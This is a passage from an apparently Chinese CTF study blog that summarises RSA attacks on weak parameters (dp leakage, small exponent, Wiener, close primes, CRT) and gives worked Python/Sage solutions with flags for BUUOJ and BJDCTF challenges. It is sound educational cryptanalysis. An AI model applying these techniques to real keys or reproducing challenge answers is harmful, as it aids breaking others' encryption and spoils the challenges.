<li>要先根据e,dp求p。首先<br>&emsp;&emsp;$dp\ =\ d\ mod\ (p-1)$<br>&emsp;&emsp;$ed\ \equiv\ 1\ mod\ \phi(n)$<br>而$\phi(n)\ =\ (p-1)(q-1)$，所以有<br>&emsp;&emsp;$ed\ =\ 1+x(p-1)(q-1)$<br>&emsp;&emsp;$edp\ mod\ (p-1)\ \equiv\ ed\ mod\ (p-1)$<br>进而：<br>&emsp;&emsp;$edp\ =\ ed+y(p-1)$<br>&emsp;&emsp;$edp\ =\ 1+x(p-1)(q-1)+y(p-1)$<br>因此可整理为：<br>&emsp;&emsp;$edp\ =\ 1+y(p-1)$<br>又有$dp\ \lt\ p-1$，所以$e\ \gt\ y$。从1到e遍历即可求得正确的y，进而得到正确的p值。得到p后可有已知的n求得q，进而回到已知$e$和$\phi(n)$求解$d$的问题。得到代码如下，注意求p时是整型除法，否则会在n%p时报溢出错误：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">    <span class="keyword">if</span> (e*dp - <span class="number">1</span>)%y == <span class="number">0</span>:</span><br><span class="line">        p = (e*dp - <span class="number">1</span>)//y + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="小指数明文爆破"><a href="#小指数明文爆破" class="headerlink" title="小指数明文爆破"></a>小指数明文爆破</h2><p>相关例题，<a href="#Dangerous_RSA">Buuoj Dangerous RSA</a>  </p>
<ol>
<li>题目已知条件有n,e,c其中e是非常小的值，比如3。RSA的加密过程为$c=m^e\ mod\ n$。<br>如果m很小，n很大，也即可能是以下情况$^{[2]}$：<br>&emsp;&emsp;$m^e\ \lt\ n$<br>此时，$c=m^e$，开e次根即可得到m。<br>如果，$m^e \gt\ n$但是并未超过n太多，又由于对c我们可能有$m^e=c+kn$，所以可以得到以下的表达式：<br>&emsp;&emsp;$m=\sqrt[e]{c+kn}$<br>这样我们可以通过爆破k的大小来求解明文了。  </li>
<li>基本代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已知n,e,c</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+k*n,e)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(c+k*n,e)[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><code>iroot(c+k*n,e)</code>函数就是在计算$\sqrt[e]{c+kn}$，其返回结果第一个元素为计算结果，第二个元素是表示结果是否精确的布尔值  </p>
<h2 id="分数，求导"><a href="#分数，求导" class="headerlink" title="分数，求导"></a>分数，求导</h2><p>相关例题：[BJDCTF2020]easyrsa</p>
<h3 id="分数"><a href="#分数" class="headerlink" title="分数"></a>分数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fraction(8, 6) will produce a rational number equivalent to 4/3, Both arguments must be Rational. The numerator defaults to 0 and the denominator defaults to 1 so that Fraction(3) == 3 and Fraction() == 0.</span></span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line">x = Fraction(<span class="number">8</span>,<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<h3 id="求导"><a href="#求导" class="headerlink" title="求导"></a>求导</h3><p><a href="http://liao.cpython.org/scipy17/">http://liao.cpython.org/scipy17/</a><br>如对$arctan(p)$求导（p为变量）  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Derivative</span><br><span class="line">x = Derivative(arctan(p),p)</span><br></pre></td></tr></table></figure>
<h2 id="已知e-n且e很大时求d-RSA-Wiener-Attack-维纳攻击"><a href="#已知e-n且e很大时求d-RSA-Wiener-Attack-维纳攻击" class="headerlink" title="已知e,n且e很大时求d: RSA Wiener Attack 维纳攻击"></a>已知e,n且e很大时求d: RSA Wiener Attack 维纳攻击</h2><p>参考：<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a><br>求d的方法：  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> RSAwienerHacker <span class="keyword">import</span> hack_RSA</span><br><span class="line">d = hack_RSA(e,n)</span><br></pre></td></tr></table></figure>
<p>相关例题Buuoj rsa2</p>
<h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><ol>
<li>首先需要下载安装openssl，<a href="https://slproweb.com/products/Win32OpenSSL.html">下载地址</a>  </li>
<li>将其bin目录添加到系统变量path中  </li>
<li>基本用法参考<a href="https://www.cnblogs.com/wyzhou/p/9738964.html">https://www.cnblogs.com/wyzhou/p/9738964.html</a>  </li>
<li>如利用openssl从文件获取公钥信息（不输出文件）：<code>openssl rsa -pubin -in key.pub -text -noout</code></li>
</ol>
<h2 id="利用Crypto-PublicKey的RSA模块从文件中获取公钥信息n-e"><a href="#利用Crypto-PublicKey的RSA模块从文件中获取公钥信息n-e" class="headerlink" title="利用Crypto.PublicKey的RSA模块从文件中获取公钥信息n,e"></a>利用Crypto.PublicKey的RSA模块从文件中获取公钥信息n,e</h2><p>这个文件可能是二进制文件，key.pub，pub.key等形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;key.pub&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">pub = RSA.importKey(f)</span><br><span class="line"><span class="built_in">print</span>(pub.n,pub.e)</span><br></pre></td></tr></table></figure>
<p>相关例题：Buuoj RSA, <a href="https://www.cnblogs.com/vict0r/p/13445509.html">攻防世界 cr4-poor-rsa</a></p>
<h2 id="已知e-d的值和p-q的位数，求p-q的值"><a href="#已知e-d的值和p-q的位数，求p-q的值" class="headerlink" title="已知e,d的值和p,q的位数，求p,q的值"></a>已知e,d的值和p,q的位数，求p,q的值</h2><p>先验知识：<br>&emsp;&emsp;$n=pq$<br>&emsp;&emsp;$\phi(n)=(p-1)(q-1)$<br>&emsp;&emsp;$ed\equiv1\ mod\ \phi(n)$<br>所以，大概有</p>
<script type="math/tex; mode=display">
ed-1=x*\phi(n)</script><p>如果我们已知p,q的位数，那就大概知道n的位数，$\phi(n)$的位数与n差别不大。同时$ed-1$的位数可以通过其值得到范围，因此我们可以通过$\frac{(ed-1)的位数}{\phi(n)的位数}$大致确定x的位数，随即可以在此范围遍历得到素数p,q的值。<br>相关例题：[NCTF2019]babyRSA  </p>
<h2 id="已知多组n-c的值"><a href="#已知多组n-c的值" class="headerlink" title="已知多组n,c的值"></a>已知多组n,c的值</h2><h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p><a href="https://blog.csdn.net/qq_39642801/article/details/104158699?utm_medium=distribute.pc_relevant.none-task-blog-baidujs-4">参考代码</a>  </p>
<h3 id="遍历n，看有无非1的公因数，其值即为p或q的值"><a href="#遍历n，看有无非1的公因数，其值即为p或q的值" class="headerlink" title="遍历n，看有无非1的公因数，其值即为p或q的值"></a>遍历n，看有无非1的公因数，其值即为p或q的值</h3><h2 id="RsaCtfTool"><a href="#RsaCtfTool" class="headerlink" title="RsaCtfTool"></a>RsaCtfTool</h2><p><a href="https://github.com/Ganapati/RsaCtfTool">源代码</a>  </p>
<ol>
<li><a href="https://www.cnblogs.com/jiugao/p/11528771.html">安装</a>过程中注意mpfr和mpc都应从官网确认最新版本后再下载对应版本并安装。  </li>
<li>使用方法：</li>
</ol>
<h2 id="已知n的值，且p，q大小相近，如何求出p和q"><a href="#已知n的值，且p，q大小相近，如何求出p和q" class="headerlink" title="已知n的值，且p，q大小相近，如何求出p和q"></a>已知n的值，且p，q大小相近，如何求出p和q</h2><ol>
<li>先对n求平方根，得到一个和p值相近的值，再求其临近的素数，即为p值  </li>
<li>q = n // p  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">near_p = isqrt(n)</span><br><span class="line">p = next_prime(near_p)</span><br><span class="line">q = n // p</span><br></pre></td></tr></table></figure>
<h2 id="已知dp-dq-p-q-c求明文"><a href="#已知dp-dq-p-q-c求明文" class="headerlink" title="已知dp,dq,p,q,c求明文"></a>已知dp,dq,p,q,c求明文</h2><p><a href="https://www.yuque.com/brooke-ygfso/mhpnug/vfy8lw#Zir1b">参考</a>  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">dp, dq, p, q, c</span>):</span></span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ) % p)*q+mq</span><br><span class="line">    <span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="Buuoj-RSA"><a href="#Buuoj-RSA" class="headerlink" title="Buuoj RSA"></a>Buuoj RSA</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><ol>
<li><p>给了flag.enc和pub.key文件，其中pub.key文件存放了公钥信息，这是个ASCII文本文件可直接用记事本打开。得到以下信息：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+</span><br><span class="line">/AvKr1rzQczdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
</li>
<li><p>借助<a href="http://tool.chacuo.net/cryptrsakeyparse">RSA密钥解析网站</a>解析密钥指数和模数信息，得以下结果：  </p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key长度：256</span><br><span class="line">模数：C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</span><br><span class="line">指数：65537</span><br></pre></td></tr></table></figure>
<ol>
<li><p>用Python得到n的十进制形式  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="string">&#x27;0xC0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD&#x27;</span></span><br><span class="line">n = <span class="built_in">int</span>(n,<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>得到n=86934482296048119190666062003494800588905656017203025617216654058378322103517，放到<a href="http://www.factordb.com/index.php">大数分解网站</a>分解。得到：  </p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=285960468890451637935629440372639283459</span><br><span class="line">q=304008741604601924494328155975272418463</span><br></pre></td></tr></table></figure>
<ol>
<li>利用gmpy2库求解d，由以上已得数据有以下代码<code>d = gmpy2.invert(e,(p-1)*(q-1))</code>，得到：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d=81176168860169991027846870170527607562179635470395365333547868786951080991441</span><br></pre></td></tr></table></figure>
<p>注意这个invert函数的用法：<br><code>invert(x, m) Return y such that x*y == 1 (mod m).</code> </p>
<ol>
<li>最后从flag.enc文件中获取flag  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line">k = rsa.PrivateKey(n,e,<span class="built_in">int</span>(d),p,q)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb+&quot;</span>).read()</span><br><span class="line">flag = rsa.decrypt(f,k)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;decrypt_256&#125;</code> </p>
<p>或者<a href="https://www.anquanke.com/post/id/217151">参考</a>  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">key_info = RSA.construct((n, e, d, p, q))</span><br><span class="line">key = RSA.importKey(key_info.exportKey())</span><br><span class="line">key = PKCS1_OAEP.new(key)</span><br><span class="line">c = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">flag = key.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>注意这个rsa.PrivateKey所有的参数都要是int  </p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>主要是获取n,e的方法不同：  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;pub.key&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">pub = RSA.importKey(f)</span><br><span class="line"><span class="built_in">print</span>(pub.n,pub.e)</span><br></pre></td></tr></table></figure>
<p>直接输出86934482296048119190666062003494800588905656017203025617216654058378322103517 65537</p>
<h2 id="BJDCTF-2nd-rsa0"><a href="#BJDCTF-2nd-rsa0" class="headerlink" title="BJDCTF 2nd rsa0"></a>BJDCTF 2nd rsa0</h2><ol>
<li>给了node3.buuoj.cn:29594，nc连接，得到<br> <img src="/2020/07/29/RSA%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/1931211-20200729165149511-1880562176.png" alt="1931211-20200729165149511-1880562176"></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 13979291</span><br><span class="line">p+q = 20977237986260593007660890508981067717396093749899360568870922582494976303967087098763078818179895715873024734793751951400162205998115419482795316817920280</span><br><span class="line">p-q = -5049426131779840852071003122042677476051158981429628650820093396659375847153227632945712179794489294190510006561721934678066481600345373791000262601840042</span><br><span class="line">c = 70438117942432148008990442238556447232354085811498412417829189204204737054074566374301936532846141586758014111171803840917548492915882174313587753182928014329241019646660166773180120124742002245739755885008339458315540236586607784113539202894986339079670203214801205209774217343754700849332717174826097340110</span><br></pre></td></tr></table></figure>
<ol>
<li>Python代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p_add_q = <span class="number">20977237986260593007660890508981067717396093749899360568870922582494976303967087098763078818179895715873024734793751951400162205998115419482795316817920280</span></span><br><span class="line">p_sub_q = -<span class="number">5049426131779840852071003122042677476051158981429628650820093396659375847153227632945712179794489294190510006561721934678066481600345373791000262601840042</span></span><br><span class="line">c = <span class="number">70438117942432148008990442238556447232354085811498412417829189204204737054074566374301936532846141586758014111171803840917548492915882174313587753182928014329241019646660166773180120124742002245739755885008339458315540236586607784113539202894986339079670203214801205209774217343754700849332717174826097340110</span></span><br><span class="line">p = (p_add_q + p_sub_q)//<span class="number">2</span></span><br><span class="line">q = (p_add_q - p_sub_q)//<span class="number">2</span></span><br><span class="line">phn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">13979291</span></span><br><span class="line">d = gmpy2.invert(e,phn)</span><br><span class="line">n = p * q</span><br><span class="line">m = <span class="built_in">pow</span>(c,<span class="built_in">int</span>(d),n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;2824f2c0-b958-4d96-9ce7-1b3d40e9333d&#125;</code></p>
<h2 id="BJDCTF-2nd-rsa1"><a href="#BJDCTF-2nd-rsa1" class="headerlink" title="BJDCTF 2nd rsa1"></a>BJDCTF 2nd rsa1</h2><ol>
<li>nc node3.buuoj.cn 28900得到：<br> <img src="/2020/07/29/RSA%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/1931211-20200729173057340-1474699671.png" alt="1931211-20200729173057340-1474699671"></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 10281503</span><br><span class="line">p^2 + q^2 = 270444057910653983291510342788952455699025527244143860021628706211845060535465451636917932321742662851778396880163283934354651585000332834898540722361841525611785115213254272403844678168824876648088734737984008962948002087685706718428981545607421310961607011733185197994774655764395053430025157272336829270370</span><br><span class="line">p - q=-1561498872519047771182262215325701201358158620347512518506157053314655896940102610797598167661629486698972575964893349157597071878670209310740687905237512</span><br><span class="line">c = 130930373832526688558829060300851483713266963254235974298431376656411167133022811317545894728612430458019135516679725462401185182477034080725489312972647811206987019087112304263037750452464797665110487543936847345204903670608123393930724575428828772013286949081350478762423388787232374366710522714351275565934</span><br></pre></td></tr></table></figure>
<ol>
<li>根据pq的信息解方程即可，$2(p^2 + q^2) - (p-q)^2 = (p+q)^2$，emmm想用Python的cmath开根号或pow时会报溢出，所以整个解题过程在sage中实现。  </li>
<li>sage代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">x = <span class="number">270444057910653983291510342788952455699025527244143860021628706211845060535465451636917932321742662851778396880163283934354651585000332834898540722361841525611785115213254272403844678168824876648088734737984008962948002087685706718428981545607421310961607011733185197994774655764395053430025157272336829270370</span></span><br><span class="line">p_sub_q = -<span class="number">1561498872519047771182262215325701201358158620347512518506157053314655896940102610797598167661629486698972575964893349157597071878670209310740687905237512</span></span><br><span class="line">p_add_q = sqrt(<span class="number">2</span>*x-<span class="built_in">pow</span>(p_sub_q,<span class="number">2</span>))</span><br><span class="line">p = (p_add_q + p_sub_q)//<span class="number">2</span></span><br><span class="line">q = (p_add_q - p_sub_q)//<span class="number">2</span></span><br><span class="line">phn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">10281503</span></span><br><span class="line">d = inverse_mod(e,phn)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">130930373832526688558829060300851483713266963254235974298431376656411167133022811317545894728612430458019135516679725462401185182477034080725489312972647811206987019087112304263037750452464797665110487543936847345204903670608123393930724575428828772013286949081350478762423388787232374366710522714351275565934</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;795faee7-4d4b-432c-9796-4758027c8a58&#125;</code></p>
<h2 id="RSAROLL"><a href="#RSAROLL" class="headerlink" title="RSAROLL"></a>RSAROLL</h2><ol>
<li>data.txt中的数据如下：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;920139713,19&#125;  </span><br><span class="line"></span><br><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">18414022</span><br><span class="line">368270835</span><br><span class="line">483295235</span><br><span class="line">263072905</span><br><span class="line">459788476</span><br><span class="line">483295235</span><br><span class="line">459788476</span><br><span class="line">663551792</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">428313374</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">425392137</span><br><span class="line">704796792</span><br><span class="line">458265677</span><br><span class="line">341524652</span><br><span class="line">483295235</span><br><span class="line">534149509</span><br><span class="line">425392137</span><br><span class="line">428313374</span><br><span class="line">425392137</span><br><span class="line">341524652</span><br><span class="line">458265677</span><br><span class="line">263072905</span><br><span class="line">483295235</span><br><span class="line">828509797</span><br><span class="line">341524652</span><br><span class="line">425392137</span><br><span class="line">475206804</span><br><span class="line">428313374</span><br><span class="line">483295235</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">306220148</span><br></pre></td></tr></table></figure>
<ol>
<li>把920139713拿到<a href="http://www.factordb.com/index.php">大数分解网站</a>分解，发现可以分解成18443和49891。所以{920139713,19}应该是{n,e}，剩下的行是密文。需要做的是循环求解每行的明文。  </li>
<li>逻辑比较简单。先由分解得到的p和q，以及已知的e求得d，然后读取data.txt中的内容，循环求解明文。代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">920139713</span></span><br><span class="line">e = <span class="number">19</span></span><br><span class="line">p = <span class="number">18443</span></span><br><span class="line">q = <span class="number">49891</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()[<span class="number">2</span>:]:</span><br><span class="line">    <span class="comment"># 从第三行开始读</span></span><br><span class="line">    c = <span class="built_in">int</span>(line)</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;13212je2ue28fy71w8u87y31r78eu1e2&#125;</code></p>
<h2 id="HDCTF2019-basic-rsa"><a href="#HDCTF2019-basic-rsa" class="headerlink" title="[HDCTF2019]basic rsa"></a>[HDCTF2019]basic rsa</h2><ol>
<li>题目attachment.py，具体代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*****************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br></pre></td></tr></table></figure>
<ol>
<li>所以基本逻辑很简单，先通过p，q，e求d，上文已经有求解方法和案例。然后利用c，d，n求<code>int(b2a_hex(flag),16)</code>再反求flag。解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">c = <span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = a2b_hex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>注意这里m从10进制转到16进制后，前面会有0x的前缀，所以取下标2及以后部分。<code>flag&#123;B4by_Rs4&#125;</code></p>
<h2 id="GUET-CTF2019-BabyRSA"><a href="#GUET-CTF2019-BabyRSA" class="headerlink" title="[GUET-CTF2019]BabyRSA"></a>[GUET-CTF2019]BabyRSA</h2><ol>
<li>题目给了一个BabyRsa文件，用winhex打开发现这是一个文本文件，直接用记事本打开即可。有以下信息：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p + q : 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span><br><span class="line">(p+1)(q+1) : 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span><br><span class="line">e : 0xe6b1bee47bd63f615c7d0a43c529d219</span><br><span class="line">d : 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span><br><span class="line">enc_flag : 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span><br></pre></td></tr></table></figure>
<ol>
<li>所以令x=p+q，y=(p+1)(q+1)，就有<code>n=p*q=y-x-1</code>，这里给的e其实用不到。直接m=pow(enc_flag,d,n)就得到明文数据了，解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment"># x = p+q</span></span><br><span class="line"><span class="comment"># y = (p+1)(q+1)</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">y = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span></span><br><span class="line">d = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">enc_flag = <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line"></span><br><span class="line">n = y - x - <span class="number">1</span></span><br><span class="line">m = <span class="built_in">pow</span>(enc_flag,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;cc7490e-78ab-11e9-b422-8ba97e5da1fd&#125;</code></p>
<h2 id="Buuoj-RSA2"><a href="#Buuoj-RSA2" class="headerlink" title="Buuoj RSA2"></a><a name="Buuoj_RSA2">Buuoj RSA2</a></h2><ol>
<li>题目信息：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line">c = 